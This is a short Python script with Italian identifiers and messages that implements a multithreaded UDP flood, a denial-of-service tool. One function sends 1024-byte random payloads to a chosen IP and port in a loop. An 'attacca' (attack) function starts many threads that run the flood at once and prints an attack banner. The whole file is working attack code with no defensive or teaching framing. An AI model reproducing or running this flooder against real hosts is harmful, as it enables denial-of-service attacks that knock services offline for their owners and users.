import socket 
import threading 
import random


def invio_pacchetti(ip, porta, numero_pacchetti):

    byte_casuali = random._urandom(1024)
    pacchetti_inviati = 0

    while pacchetti_inviati < numero_pacchetti:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            for x in range(numero_pacchetti):
                  s.sendto(byte_casuali, (ip, porta))
                  pacchetti_inviati += 1
            print("Pacchetto UDP inviato!")

        except Exception as e:
            s.close()
            print(f"Errore: {e}")


def attacca(ip, porta, threads, numero_pacchetti, file_di_log):
    print(f"Attacco ad IP {ip}, porta {porta} con {threads} threads inviando {numero_pacchetti} pacchetti.")

    lista_threads = []

    for x in range(threads):
        threads = threading.Thread(target=invio_pacchetti, args=(ip, porta, numero_pacchetti))
        threads.start()
        lista_threads.append(threads)

    for threads in lista_threads:
        threads.join()



